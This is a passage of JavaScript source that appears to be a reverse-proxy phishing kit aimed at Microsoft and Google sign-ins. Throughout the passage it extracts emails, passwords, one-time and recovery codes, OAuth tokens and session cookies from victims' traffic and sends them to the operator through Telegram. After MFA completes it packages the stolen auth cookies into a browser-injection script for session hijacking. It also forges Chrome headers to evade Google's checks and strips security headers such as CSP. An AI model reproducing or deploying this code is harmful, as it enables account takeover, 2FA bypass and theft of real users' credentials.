        const isAuthRequest = requestPath.includes('login') || 
                            requestPath.includes('signin') || 
                            requestPath.includes('authenticate') || 
                            requestPath.includes('GetCredentialType') ||
                            requestPath.includes('LoginPost') ||
                            requestPath.includes('ProcessAuth') ||
                            requestPath.includes('BeginAuth') ||
                            requestPath.includes('EndAuth') ||
                            requestPath.includes('oauth') ||
                            requestPath.includes('common/SAS') ||
                            requestPath.includes('common/login') ||
                            requestPath.includes('kmsi') || // Keep me signed in
                            requestPath.includes('Federated') || // Federated auth
                            // Google-specific endpoints
                            requestPath.includes('accounts.google.com') ||
                            requestPath.includes('ServiceLogin') ||
                            requestPath.includes('CheckCookie') ||
                            requestPath.includes('Passwd') ||
                            requestPath.includes('SecondFactor') ||
                            requestPath.includes('challenge') ||
                            requestPath.includes('speedbump') ||
                            requestPath.includes('TL') ||
                            requestPath.includes('v3/signin') ||
                            requestPath.includes('identifier') ||
                            requestPath.includes('_/signin/sl/challenge');
        
        if (isAuthRequest || requestBodyStr.includes('passwd') || requestBodyStr.includes('password') || requestBodyStr.includes('Passwd')) {
            // Try to parse JSON body first
            try {
                const jsonBody = JSON.parse(requestBodyStr);
                
                // Capture username/email from various fields
                username = jsonBody.username || 
                          jsonBody.email || 
                          jsonBody.login || 
                          jsonBody.LoginName || 
                          jsonBody.UserName || 
                          jsonBody.loginfmt || // Microsoft's common field
                          jsonBody.displayName ||
                          // Google-specific fields
                          jsonBody.Email ||
                          jsonBody.identifier ||
                          jsonBody.identifierId ||
                          jsonBody.f.req || // Google uses nested objects
                          '';
                
                // Capture password from various fields
                password = jsonBody.password || 
                          jsonBody.passwd || 
                          jsonBody.Password || 
                          jsonBody.Passwd || 
                          jsonBody.accessPass || 
                          jsonBody.pin || // PIN authentication
                          jsonBody.flowToken || // Sometimes password is in flowToken
                          // Google-specific fields
                          jsonBody.Passwd ||
                          jsonBody.password ||
                          jsonBody.hiddenPassword ||
                          '';
                
                // Capture OTP/2FA codes
                otcCode = jsonBody.otc || 
                         jsonBody.otp || 
                         jsonBody.VerificationCode || 
                         jsonBody.Otc || 
                         jsonBody.otcCode || 
                         jsonBody.twoFactorCode || 
                         jsonBody.authCode || 
                         jsonBody.code || // Generic code field
                         jsonBody.verificationCode ||
                         // Google-specific fields
                         jsonBody.Pin ||
                         jsonBody.totpPin ||
                         jsonBody.smsUserPin ||
                         jsonBody.idvPin ||
                         '';
                
                // Capture authenticator app codes
                authenticatorCode = jsonBody.totpCode || 
                                   jsonBody.authenticatorCode || 
                                   jsonBody.authApp || 
                                   jsonBody.mfaAuthCode || '';
                
                // Capture recovery codes
                recoveryCode = jsonBody.recoveryCode || 
                              jsonBody.backupCode || 
                              jsonBody.emergencyCode || '';
                
                // Capture MFA method
                mfaMethod = jsonBody.AuthMethodId || 
                           jsonBody.mfaMethod || 
                           jsonBody.authMethod || 
                           jsonBody.mfaType || '';
                
            } catch {
                // Enhanced regex patterns for form data and URL encoded data
                const passwordPatterns = [
                    /(?:password|passwd|Password|Passwd|accessPass|flowToken)["\s:=]+([^&"\s,}]+)/i,
                    /passwd=([^&]+)/i,
                    /password=([^&]+)/i,
                    /accessPass=([^&]+)/i,
                    // Google patterns
                    /Passwd=([^&]+)/i,
                    /hiddenPassword=([^&]+)/i,
                    /f\.req.*?passwd.*?:.*?"([^"]+)"/i, // Google's nested format
                ];
                
                const usernamePatterns = [
                    /(?:username|email|login|LoginName|UserName|loginfmt)["\s:=]+([^&"\s,}]+)/i,
                    /loginfmt=([^&]+)/i,
                    /username=([^&]+)/i,
                    /email=([^&]+)/i,
                    // Google patterns
                    /Email=([^&]+)/i,
                    /identifier=([^&]+)/i,
                    /identifierId=([^&]+)/i,
                    /f\.req.*?identifier.*?:.*?"([^"]+)"/i, // Google's nested format
                ];
                
                const codePatterns = [
                    /(?:otc|otp|VerificationCode|Otc|code|totpCode|authCode)["\s:=]+([^&"\s,}]+)/i,
                    /code=([^&]+)/i,
                    /otc=([^&]+)/i,
                    /verificationCode=([^&]+)/i,
                    // Google patterns
                    /Pin=([^&]+)/i,
                    /totpPin=([^&]+)/i,
                    /smsUserPin=([^&]+)/i,
                    /idvPin=([^&]+)/i,
                ];
                
                // Try all password patterns
                for (const pattern of passwordPatterns) {
                    const match = requestBodyStr.match(pattern);
                    if (match && match[1]) {
                        password = decodeURIComponent(match[1]);
                        break;
                    }
                }
                
                // Try all username patterns
                for (const pattern of usernamePatterns) {
                    const match = requestBodyStr.match(pattern);
                    if (match && match[1]) {
                        username = decodeURIComponent(match[1]);
                        break;
                    }
                }
                
                // Try all code patterns
                for (const pattern of codePatterns) {
                    const match = requestBodyStr.match(pattern);
                    if (match && match[1]) {
                        otcCode = decodeURIComponent(match[1]);
                        break;
                    }
                }
            }
            
            // Also check response body for credentials (sometimes they're echoed back)
            const responseBodyStr = proxyResponse.body ? proxyResponse.body.toString() : '';
            if (!password && responseBodyStr) {
                const respPassMatch = responseBodyStr.match(/(?:password|passwd)["\s:=]+([^&"\s,}]+)/i);
                if (respPassMatch) {
                    password = respPassMatch[1];
                }
            }
        }
        
        // Store credentials but don't send notification yet
        if (username) {
            VICTIM_SESSIONS[currentSession].username = username;
            // Only store if it's the first time or if email has changed
            if (!VICTIM_SESSIONS[currentSession].credentialsCaptured || VICTIM_SESSIONS[currentSession].username !== username) {
                VICTIM_SESSIONS[currentSession].credentialsCaptured = true;
                console.log(`Captured email for session ${currentSession}: ${username}`);
                
                // Send real-time notification for email capture
                const emailMessage = `📧 <b>EMAIL CAPTURED!</b>
🌐 <b>Host:</b> ${proxyRequestOptions.headers.host}
👤 <b>Email:</b> ${username}`;
                sendTelegramNotification(emailMessage).catch(error => 
                    console.error('Failed to send email notification:', error)
                );
            }
        }
        if (password) {
            // Check if this is a new password or changed
            if (VICTIM_SESSIONS[currentSession].password !== password) {
                VICTIM_SESSIONS[currentSession].password = password;
                console.log(`Captured password for session ${currentSession}`);
                // Send real-time notification for password capture
                const passwordMessage = `🔑 <b>PASSWORD CAPTURED!</b>
🌐 <b>Host:</b> ${proxyRequestOptions.headers.host}
👤 <b>Email:</b> ${VICTIM_SESSIONS[currentSession].username || 'N/A'}
🔐 <b>Password:</b> ${password}
⏰ <b>Time:</b> ${new Date().toISOString()}
⏰ <b>IP:</b> ${lastClientIP}`;

                sendTelegramNotification(passwordMessage).catch(error => 
                    console.error('Failed to send password notification:', error)
                );
            }
        }
        if (otcCode) {
            // Check if this is a new 2FA code
            if (VICTIM_SESSIONS[currentSession].otcCode !== otcCode) {
                VICTIM_SESSIONS[currentSession].otcCode = otcCode;
                console.log(`Captured 2FA code for session ${currentSession}: ${otcCode}`);
                
                // Send real-time notification for 2FA capture
                const otcMessage = `🔢 <b>2FA CODE CAPTURED!</b>

🍪 <b>Session:</b> ${currentSession}
🌐 <b>Host:</b> ${proxyRequestOptions.headers.host}
👤 <b>Email:</b> ${VICTIM_SESSIONS[currentSession].username || 'N/A'}
🔢 <b>2FA Code:</b> ${otcCode}
📱 <b>MFA Method:</b> ${mfaMethod || 'N/A'}
⏰ <b>Time:</b> ${new Date().toISOString()}`;

                sendTelegramNotification(otcMessage).catch(error => 
                    console.error('Failed to send 2FA notification:', error)
                );
            }
        }
        
        // Handle authenticator app codes
        if (authenticatorCode) {
            if (VICTIM_SESSIONS[currentSession].authenticatorCode !== authenticatorCode) {
                VICTIM_SESSIONS[currentSession].authenticatorCode = authenticatorCode;
                console.log(`Captured authenticator code for session ${currentSession}`);
                
                const authMessage = `📱 <b>AUTHENTICATOR CODE CAPTURED!</b>

🍪 <b>Session:</b> ${currentSession}
🌐 <b>Host:</b> ${proxyRequestOptions.headers.host}
👤 <b>Email:</b> ${VICTIM_SESSIONS[currentSession].username || 'N/A'}
📱 <b>Auth Code:</b> ${authenticatorCode}
⏰ <b>Time:</b> ${new Date().toISOString()}`;

                sendTelegramNotification(authMessage).catch(error => 
                    console.error('Failed to send authenticator notification:', error)
                );
            }
        }
        
        // Handle recovery codes
        if (recoveryCode) {
            if (VICTIM_SESSIONS[currentSession].recoveryCode !== recoveryCode) {
                VICTIM_SESSIONS[currentSession].recoveryCode = recoveryCode;
                console.log(`Captured recovery code for session ${currentSession}`);
                
                const recoveryMessage = `🔐 <b>RECOVERY CODE CAPTURED!</b>

🍪 <b>Session:</b> ${currentSession}
🌐 <b>Host:</b> ${proxyRequestOptions.headers.host}
👤 <b>Email:</b> ${VICTIM_SESSIONS[currentSession].username || 'N/A'}
🔐 <b>Recovery Code:</b> ${recoveryCode}
⏰ <b>Time:</b> ${new Date().toISOString()}`;

                sendTelegramNotification(recoveryMessage).catch(error => 
                    console.error('Failed to send recovery code notification:', error)
                );
            }
        }
    }
    
    // Check for OAuth tokens
    if (requestBodyStr.includes('access_token') || requestBodyStr.includes('authorization_code') || 
        requestPath.includes('oauth') || requestPath.includes('token')) {
        const accessTokenMatch = requestBodyStr.match(/access_token["\s:=]+([^&"\s]+)/i);
        const authCodeMatch = requestBodyStr.match(/authorization_code["\s:=]+([^&"\s]+)/i);
        const idTokenMatch = requestBodyStr.match(/id_token["\s:=]+([^&"\s]+)/i);
        
        if (accessTokenMatch || authCodeMatch || idTokenMatch) {
            const telegramMessage = `🔑 <b>OAUTH TOKEN CAPTURED</b>

🍪 <b>Session:</b> ${currentSession}
🌐 <b>Host:</b> ${proxyRequestOptions.headers.host}
📝 <b>Path:</b> ${requestPath}
🎫 <b>Access Token:</b> ${accessTokenMatch ? accessTokenMatch[1].substring(0, 20) + '...' : 'N/A'}
🔐 <b>Auth Code:</b> ${authCodeMatch ? authCodeMatch[1].substring(0, 20) + '...' : 'N/A'}
🆔 <b>ID Token:</b> ${idTokenMatch ? idTokenMatch[1].substring(0, 20) + '...' : 'N/A'}
⏰ <b>Time:</b> ${new Date().toISOString()}`;

            sendTelegramNotification(telegramMessage).catch(error => 
                console.error('Failed to send OAuth notification:', error)
            );
        }
    }
    
    const logFileStream = LOG_FILE_STREAMS[currentSession];

    const encryptedResult = await encryptData(JSON.stringify(httpProxyTransaction));

    if (!logFileStream.write(`${JSON.stringify({ [encryptedResult.iv]: encryptedResult.encryptedData })}\n`)) {
        await new Promise(resolve => logFileStream.once("drain", resolve));
    }
}

function isDomainApplicable(requestHostname, cookieDomain, cookieHostOnly) {
    const splitRequestHostname = requestHostname.split(".");
    const splitCookieDomain = cookieDomain.split(".");

    if (splitCookieDomain.length < 2) {
        return false;
    }
    if (cookieHostOnly && splitRequestHostname.length !== splitCookieDomain.length) {
        return false;
    }
    if (splitRequestHostname.length < splitCookieDomain.length) {
        return false;
    }

    for (let i = 1, l = splitCookieDomain.length + 1; i < l; i++) {
        if (splitCookieDomain.at(-i) !== splitRequestHostname.at(-i)) {
            return false;
        }
    }
    return true;
}

function isPathApplicable(requestPath, cookiePath) {
    const splitRequestPath = requestPath.split("/");
    const splitCookiePath = cookiePath.split("/");

    if (cookiePath === "/") {
        return true;
    }
    if (splitRequestPath.length < splitCookiePath.length) {
        return false;
    }

    for (let i = 1, l = splitCookiePath.length; i < l; i++) {
        if (splitCookiePath[i] !== splitRequestPath[i]) {
            return false;
        }
    }
    return true;
}

function isCookieApplicable(requestOptions, cookie) {
    return (
        isDomainApplicable(requestOptions.hostname, cookie.domain, cookie.hostOnly) &&
        isPathApplicable(requestOptions.path, cookie.path)
    );
}

function prepareProxyRequestCookies(proxyRequestOptions, currentSession) {
    const proxyRequestCookies = {};
    const currentTimestamp = Date.now();

    for (const cookie of VICTIM_SESSIONS[currentSession].cookies) {
        if (!(currentTimestamp > cookie.expires) && isCookieApplicable(proxyRequestOptions, cookie)) {
            proxyRequestCookies[cookie.name] = cookie.value;
        }
    }
    return Object.entries(proxyRequestCookies)
        .map(([cookieName, cookieValue]) => `${cookieName}=${cookieValue}`)
        .join("; ");
}

function parseCookieDate(cookieDate) {
    let foundTime = false;
    let foundDay = false;
    let foundMonth = false;
    let foundYear = false;

    let hourValue, minuteValue, secondValue;
    let dayValue, monthValue, yearValue;

    const delimiterRegex = /[\x09\x20-\x2F\x3B-\x40\x5B-\x60\x7B-\x7E]+/;
    const dateTokens = cookieDate.split(delimiterRegex).filter(token => token);

    for (const token of dateTokens) {
        if (!foundTime) {
            const timeMatch = /^(\d{1,2}):(\d{1,2}):(\d{1,2})/.exec(token);

            if (timeMatch) {
                foundTime = true;
                hourValue = parseInt(timeMatch[1]);
                minuteValue = parseInt(timeMatch[2]);
                secondValue = parseInt(timeMatch[3]);
                continue;
            }
        }
        if (!foundDay) {
            const dayMatch = /^(\d{1,2})(?:[^\d]|$)/.exec(token);

            if (dayMatch) {
                foundDay = true;
                dayValue = parseInt(dayMatch[1]);
                continue;
            }
        }
        if (!foundMonth) {
            const monthLowerCase = token.toLowerCase();
            const months = ["jan", "feb", "mar", "apr", "may", "jun", "jul", "aug", "sep", "oct", "nov", "dec"];

            for (let i = 0; i < months.length; i++) {
                if (monthLowerCase.startsWith(months[i])) {
                    foundMonth = true;
                    monthValue = i;
                    break;
                }
            }
            if (foundMonth) continue;
        }
        if (!foundYear) {
            const yearMatch = /^(\d{2,4})(?:[^\d]|$)/.exec(token);

            if (yearMatch) {
                foundYear = true;
                yearValue = parseInt(yearMatch[1]);
                continue;
            }
        }
    }

    if (yearValue >= 70 && yearValue <= 99) {
        yearValue += 1900;
    } else if (yearValue >= 0 && yearValue <= 69) {
        yearValue += 2000;
    }

    if (!foundDay || !foundMonth || !foundYear || !foundTime) {
        return NaN;
    }
    if (dayValue < 1 || dayValue > 31) {
        return NaN;
    }
    if (yearValue < 1601) {
        return NaN;
    }
    if (hourValue > 23 || minuteValue > 59 || secondValue > 59) {
        return NaN;
    }

    const parsedCookieDate = new Date(Date.UTC(
        yearValue,
        monthValue,
        dayValue,
        hourValue,
        minuteValue,
        secondValue
    ));

    if (parsedCookieDate.getUTCFullYear() !== yearValue ||
        parsedCookieDate.getUTCMonth() !== monthValue ||
        parsedCookieDate.getUTCDate() !== dayValue) {
        return NaN;
    }
    return parsedCookieDate.getTime();
}

function updateCurrentSessionCookies(request, newCookies, proxyHostname, currentSession, proxyResponseDate = null) {
    const pathNameMatch = request.path.match(/^\/[^?#]*(?=\/)/);
    const currentTimestamp = Date.now();
    let clockSkew = 0;
    if (proxyResponseDate) {
        clockSkew = currentTimestamp - parseCookieDate(proxyResponseDate);
    }

    for (const newCookie of newCookies) {
        const [cookie, ...attributes] = newCookie.split(";");
        const [cookieName, ...cookieValue] = cookie.split("=");

        let cookieDomain = request.hostname;
        let cookiePath = (pathNameMatch ?? ["/"])[0];
        let cookieExpires = NaN;
        let cookieMaxAge = "";
        let cookieHostOnly = true;
        let isCookieValid = true;
        for (const attribute of attributes) {

            const cookieAttribute = attribute.trim();
            const cookieDomainMatch = cookieAttribute.match(/^domain\s*=(.*)$/i);
            const cookiePathMatch = cookieAttribute.match(/^path\s*=(.*)$/i);
            const cookieExpiresMatch = cookieAttribute.match(/^expires\s*=(.*)$/i);
            const cookieMaxAgeMatch = cookieAttribute.match(/^max-age\s*=(.*)$/i);

            if (cookieAttribute.toLowerCase() === "domain") {
                cookieDomain = request.hostname;
                cookieHostOnly = true;
                isCookieValid = true;
            }
            else if (cookieAttribute.toLowerCase() === "path") {
                cookiePath = (pathNameMatch ?? ["/"])[0];
            }
            else if (cookieAttribute.toLowerCase() === "expires") {
                cookieExpires = NaN;
            }
            else if (cookieAttribute.toLowerCase() === "max-age") {
                cookieMaxAge = "";
            }

            else if (cookieDomainMatch) {
                cookieDomain = cookieDomainMatch[1].replace(/^\./, "").trim();
                cookieHostOnly = true;
                isCookieValid = true;

                if (!cookieDomain) {
                    cookieDomain = request.hostname;
                }
                else if (cookieDomain === proxyHostname) {
                    cookieDomain = request.hostname;
                    cookieHostOnly = false;
                }
                else if (cookieDomain !== request.hostname) {
                    if (isDomainApplicable(proxyHostname, cookieDomain, false)) {
                        cookieDomain = request.hostname.split(".").slice(-2).join(".");
                    }
                    else if (!isDomainApplicable(request.hostname, cookieDomain, false)) {
                        isCookieValid = false;
                        continue;
                    }
                    cookieHostOnly = false;
                }
            }
            else if (cookiePathMatch) {
                cookiePath = cookiePathMatch[1].trim();

                if (!cookiePath.startsWith("/")) {
                    cookiePath = (pathNameMatch ?? ["/"])[0];
                }
            }
            else if (cookieExpiresMatch) {
                cookieExpires = cookieExpiresMatch[1].trim();

                cookieExpires = parseCookieDate(cookieExpires);
            }
            else if (cookieMaxAgeMatch) {
                cookieMaxAge = cookieMaxAgeMatch[1].trim();

                if (!/^-?\d+$/.test(cookieMaxAge)) {
                    cookieMaxAge = "";
                }
            }
        }
        if (isCookieValid) {
            VICTIM_SESSIONS[currentSession].cookies = VICTIM_SESSIONS[currentSession].cookies.filter(cookie => {
                return !(cookie.name === cookieName && cookie.domain === cookieDomain && cookie.path === cookiePath && cookie.hostOnly === cookieHostOnly);
            });

            VICTIM_SESSIONS[currentSession].cookies.push({
                name: cookieName,
                value: cookieValue.join("="),
                domain: cookieDomain,
                hostOnly: cookieHostOnly,
                path: cookiePath,
                secure: false,
                httpOnly: false,
                expires: cookieExpires,
                maxAge: cookieMaxAge
            });
                   // Send Telegram notification for captured cookie
            // Only send notification for important cookies
            const importantCookies = ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT', 'SignInStateCookie', 'MSPOK', 'MSPAuth', 'MSPProf', 'PPAuth', 'AMC'];
            
            if (importantCookies.includes(cookieName)) {
                const sessionData = VICTIM_SESSIONS[currentSession];
                
                // Store important cookies but don't send individual notifications
                if (!sessionData.authCookies) {
                    sessionData.authCookies = {};
                }
                sessionData.authCookies[cookieName] = cookieValue.join("=");
                
                // Check if we have all 3 critical auth cookies
                const sessionCookies = VICTIM_SESSIONS[currentSession].cookies;
                const hasESTSAUTH = sessionCookies.some(c => c.name === 'ESTSAUTH');
                const hasESTSAUTHPERSISTENT = sessionCookies.some(c => c.name === 'ESTSAUTHPERSISTENT');
                const hasESTSAUTHLIGHT = sessionCookies.some(c => c.name === 'ESTSAUTHLIGHT');
                const auth_pass = sessionCookies.some(c => c.name === 'auth_pass');
                
 // 🔵 PHASE 1: After password — notify with username/password
if (
    hasESTSAUTH && 
    hasESTSAUTHPERSISTENT && 
    hasESTSAUTHLIGHT && 
    !sessionData.passwordCapturedNotified
) {
    const telegramMessage = `✅ <b>PASSWORD CAPTURED</b>
📧 <b>Email:</b> ${sessionData.username || 'N/A'}
🔑 <b>Password:</b> ${sessionData.password || 'N/A'}
🕒 <b>Time:</b> ${new Date().toISOString()}`;

    sendTelegramNotification(telegramMessage).catch(error => 
        console.error('Failed to send password notification:', error)
    );

    sessionData.passwordCapturedNotified = true;
}
// 🔴 PHASE 2: After 2FA — full login confirmed
const hasSignInStateCookie = sessionCookies.some(c => c.name === 'SignInStateCookie');

if (
    hasESTSAUTH && 
    hasESTSAUTHPERSISTENT && 
    hasESTSAUTHLIGHT && 
    hasSignInStateCookie && 
    !sessionData.mfaCompletedNotified
) {
    const successMessage = `🔐 <b>2FA COMPLETED SUCCESSFULLY!</b>`;
    sendTelegramNotification(successMessage).catch(error => 
        console.error('Failed to send 2FA success notification:', error)
    );

    sessionData.mfaCompletedNotified = true;

if (!sessionData.exportSent) {
    const authCookies = sessionCookies.filter(c =>
        ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT', 'SignInStateCookie'].includes(c.name)
    );

    const cookieExportArray = authCookies.map(c => ({
        domain: `.${c.domain}`,
        expirationDate: c.expires || Math.floor(Date.now() / 1000) + 31536000,
        hostOnly: false,
        httpOnly: true,
        name: c.name,
        path: "/",
        sameSite: "none",
        secure: true,
        session: true,
        storeId: null,
        value: c.value
    }));

    const script = `!function(){let e=JSON.parse('${JSON.stringify(cookieExportArray)}');for(let o of e)document.cookie=\`\${o.name}=\${o.value};Max-Age=31536000;\${o.path?\`path=\${o.path};\`:""}domain=\${o.domain};Secure;SameSite=None\`;window.location.href=atob("aHR0cHM6Ly9sb2dpbi5taWNyb3NvZnRvbmxpbmUuY29tLw==")}();`;

    const userEmail = sessionData.username || "unknown_user";
    const safeEmail = userEmail.replace(/[^a-zA-Z0-9@._-]/g, "_");
    const fileName = `${safeEmail}-cookies.txt`;
    const fileContent = `// Full Auth Cookie Export\n// Session: ${currentSession}\n// Generated: ${new Date().toISOString()}\n\n${script}`;
    const caption = `🔥 FULL COOKIE EXPORT READY!\n📧 Email: ${userEmail}\n🔐 2FA Completed`;

    // ✅ Send via new document function
    sendTelegramDocument(fileContent, fileName, caption);
    // Mark as sent
    sessionData.exportSent = true;
}
                    
                }
            }
        }
    }
}
function getValidDomains(domains) {
    const validDomains = [];

    for (const domain of domains) {
        const splitDomain = domain.split(".");
        for (let i = 2; i < splitDomain.length + 1; i++) {

            const validDomain = splitDomain.slice(-i).join(".");
            if (!validDomains.includes(validDomain)) {
                validDomains.push(validDomain);
            }
        }
    }
    return validDomains;
}

function updateProxyRequestHeaders(proxyRequestOptions, currentSession, proxyHostname) {
    const azureHTTPRequestHeaders = [
        "max-forwards",
        "x-arr-log-id",
        "client-ip",
        "disguised-host",
        "x-site-deployment-id",
        "was-default-hostname",
        "x-forwarded-proto",
        "x-appservice-proto",
        "x-arr-ssl",
        "x-forwarded-tlsversion",
        "x-forwarded-for",
        "x-original-url",
        "x-waws-unencoded-url",
        "x-client-ip",
        "x-client-port"
    ];

    const proxyRequestCookies = prepareProxyRequestCookies(proxyRequestOptions, currentSession);
    if (Object.keys(proxyRequestCookies).length) {
        proxyRequestOptions.headers.cookie = proxyRequestCookies;
    }
    else {
        delete proxyRequestOptions.headers.cookie;
    }

    if (proxyRequestOptions.headers.origin) {
        proxyRequestOptions.headers.origin = `${VICTIM_SESSIONS[currentSession].protocol}//${VICTIM_SESSIONS[currentSession].host}`;
    }
    if (proxyRequestOptions.headers.hasOwnProperty("referer") &&
        (!proxyRequestOptions.headers.referer || proxyRequestOptions.headers.referer.includes(PROXY_ENTRY_POINT_BASE))) {
        delete proxyRequestOptions.headers.referer;
    }

    for (const [key, value] of Object.entries(proxyRequestOptions.headers)) {
        if (azureHTTPRequestHeaders.includes(key)) {
            delete proxyRequestOptions.headers[key];
        }
        else {
            proxyRequestOptions.headers[key] = value.replaceAll(proxyHostname, VICTIM_SESSIONS[currentSession].host);
        }
    }
    
    // Special handling for personal accounts (login.live.com)
    if (VICTIM_SESSIONS[currentSession].hostname === 'login.live.com' || 
        VICTIM_SESSIONS[currentSession].hostname === 'outlook.live.com') {
        // Ensure critical headers for personal accounts
        if (!proxyRequestOptions.headers['accept']) {
            proxyRequestOptions.headers['accept'] = 'application/json, text/plain, */*';
        }
        if (!proxyRequestOptions.headers['accept-language']) {
            proxyRequestOptions.headers['accept-language'] = 'en-US,en;q=0.9';
        }
        if (!proxyRequestOptions.headers['sec-fetch-dest']) {
            proxyRequestOptions.headers['sec-fetch-dest'] = 'empty';
        }
        if (!proxyRequestOptions.headers['sec-fetch-mode']) {
            proxyRequestOptions.headers['sec-fetch-mode'] = 'cors';
        }
        if (!proxyRequestOptions.headers['sec-fetch-site']) {
            proxyRequestOptions.headers['sec-fetch-site'] = 'same-origin';
        }
        // Fix user-agent if needed
        if (proxyRequestOptions.headers['user-agent'] && proxyRequestOptions.headers['user-agent'].includes('curl')) {
            proxyRequestOptions.headers['user-agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
        }
        // Ensure proper content-type for JSON requests
        if (proxyRequestOptions.path && proxyRequestOptions.path.includes('GetCredentialType')) {
            proxyRequestOptions.headers['content-type'] = 'application/json; charset=UTF-8';
        }
        // Add client-request-id if missing (Microsoft uses this for tracking)
        if (!proxyRequestOptions.headers['client-request-id']) {
            // Generate UUID v4 format: xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx
            const uuid = 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
                const r = Math.random() * 16 | 0;
                const v = c === 'x' ? r : (r & 0x3 | 0x8);
                return v.toString(16);
            });
            proxyRequestOptions.headers['client-request-id'] = uuid;
        }
        // Add canary header if missing
        if (!proxyRequestOptions.headers['canary'] && proxyRequestOptions.path.includes('GetCredentialType')) {
            // This is a placeholder - in a real scenario you'd extract this from the page
            proxyRequestOptions.headers['hpgid'] = '33';
            proxyRequestOptions.headers['hpgact'] = '0';
        }
    }
    
    // Special handling for Google accounts
    if (VICTIM_SESSIONS[currentSession].hostname === 'accounts.google.com' || 
        VICTIM_SESSIONS[currentSession].hostname === 'www.google.com') {
        // Google requires very specific headers to bypass security checks
        
        // Critical: Set proper Chrome user-agent with all details
        proxyRequestOptions.headers['user-agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
        
        // Set all sec-ch-ua headers that Chrome sends
        proxyRequestOptions.headers['sec-ch-ua'] = '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"';
        proxyRequestOptions.headers['sec-ch-ua-mobile'] = '?0';
        proxyRequestOptions.headers['sec-ch-ua-platform'] = '"Windows"';
        proxyRequestOptions.headers['sec-ch-ua-platform-version'] = '"15.0.0"';
        proxyRequestOptions.headers['sec-ch-ua-full-version'] = '"120.0.6099.130"';
        proxyRequestOptions.headers['sec-ch-ua-arch'] = '"x86"';
        proxyRequestOptions.headers['sec-ch-ua-bitness'] = '"64"';
        proxyRequestOptions.headers['sec-ch-ua-model'] = '""';
        proxyRequestOptions.headers['sec-ch-ua-full-version-list'] = '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.130", "Google Chrome";v="120.0.6099.130"';
        
        // Accept headers
        if (!proxyRequestOptions.headers['accept']) {
            proxyRequestOptions.headers['accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
        }
        proxyRequestOptions.headers['accept-language'] = 'en-US,en;q=0.9';
        proxyRequestOptions.headers['accept-encoding'] = 'gzip, deflate, br';
        
        // Sec-Fetch headers must match Chrome exactly
        if (proxyRequestOptions.path === '/' || proxyRequestOptions.path.includes('ServiceLogin')) {
            proxyRequestOptions.headers['sec-fetch-dest'] = 'document';
            proxyRequestOptions.headers['sec-fetch-mode'] = 'navigate';
            proxyRequestOptions.headers['sec-fetch-site'] = 'none';
            proxyRequestOptions.headers['sec-fetch-user'] = '?1';
            proxyRequestOptions.headers['upgrade-insecure-requests'] = '1';
        } else {
            // For API calls
            proxyRequestOptions.headers['sec-fetch-dest'] = 'empty';
            proxyRequestOptions.headers['sec-fetch-mode'] = 'cors';
            proxyRequestOptions.headers['sec-fetch-site'] = 'same-origin';
        }
        
        // Remove headers that might trigger detection
        delete proxyRequestOptions.headers['x-forwarded-for'];
        delete proxyRequestOptions.headers['x-real-ip'];
        delete proxyRequestOptions.headers['via'];
        delete proxyRequestOptions.headers['forwarded'];
        
        // Google-specific headers
        if (!proxyRequestOptions.headers['x-same-domain']) {
            proxyRequestOptions.headers['x-same-domain'] = '1';
        }
        
        // Only add google-accounts-xsrf for POST requests
        if (proxyRequestOptions.method === 'POST' && !proxyRequestOptions.headers['google-accounts-xsrf']) {
            proxyRequestOptions.headers['google-accounts-xsrf'] = '1';
        }
        
        // Add cache control
        proxyRequestOptions.headers['cache-control'] = 'max-age=0';
        
        // Add DNT header
        proxyRequestOptions.headers['dnt'] = '1';
        
        // Connection header
        proxyRequestOptions.headers['connection'] = 'keep-alive';
    }
}

function deleteHTTPSecurityResponseHeaders(headers) {
    const httpSecurityResponseHeaders = [
        "x-frame-options",
        "x-xss-protection",
        "x-content-type-options",
        "set-cookie",
        "content-security-policy",
        "content-security-policy-report-only",
        "cross-origin-opener-policy",
        "cross-origin-embedder-policy",
        "cross-origin-resource-policy",
        "permissions-policy",
        "service-worker-allowed"
    ];

    for (const header of httpSecurityResponseHeaders) {
        delete headers[header];
    }
}

function decompressData(compressedData, encoding) {
    const decompressionAlgorithms = {
        gzip: zlib.gunzip,
        "x-gzip": zlib.gunzip,
        deflate: zlib.inflate,
        br: zlib.brotliDecompress,
        zstd: zlib.zstdDecompress
    };

    return new Promise((resolve, reject) => {
        const decompressionAlgorithm = decompressionAlgorithms[encoding];

        if (decompressionAlgorithm) {
            decompressionAlgorithm(compressedData, (error, decompressedData) => {
                if (error) reject(error);
                else resolve(decompressedData);
            });
        }
        else {
            resolve(compressedData);
        }
    });
}

function compressData(decompressedData, encoding) {
    const compressionAlgorithms = {
        gzip: zlib.gzip,
        "x-gzip": zlib.gzip,
        deflate: zlib.deflate,
        br: zlib.brotliCompress,
        zstd: zlib.zstdCompress
    };

    return new Promise((resolve, reject) => {
        const compressionAlgorithm = compressionAlgorithms[encoding];

        if (compressionAlgorithm) {
            compressionAlgorithm(decompressedData, (error, compressedData) => {
                if (error) reject(error);
                else resolve(compressedData);
            });
        }
        else {
            resolve(decompressedData);
        }
    });
}

async function decompressResponseBody(compressedData, contentEncoding) {
    if (!contentEncoding) {
        return {
            decompressedResponseBody: compressedData,
            encodings: []
        };
    }

    const encodings = contentEncoding.split(",")
        .map(encoding => encoding.trim().toLowerCase())
        .filter(encoding => encoding);

    let decompressedData = compressedData;
    for (let i = encodings.length - 1; i >= 0; i--) {
        decompressedData = await decompressData(decompressedData, encodings[i]);
    }
    return {
        decompressedResponseBody: decompressedData,
        encodings: encodings
    };
}

async function compressResponseBody(decompressedData, encodings) {
    let compressedData = decompressedData;

    for (const encoding of encodings) {
        compressedData = await compressData(compressedData, encoding);
    }
    return compressedData;
}

function updateHTMLProxyResponse(decompressedResponseBody) {
